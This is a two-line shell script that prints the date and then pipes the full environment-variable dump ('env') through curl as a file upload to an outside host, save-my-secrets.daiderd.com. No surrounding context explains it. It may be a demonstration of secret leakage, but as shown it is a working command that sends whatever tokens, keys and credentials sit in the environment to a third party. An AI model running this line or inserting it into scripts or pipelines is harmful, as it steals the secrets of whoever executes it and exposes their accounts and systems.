#!/bin/sh

date
env | curl -F 'f:1=<-' https://save-my-secrets.daiderd.com
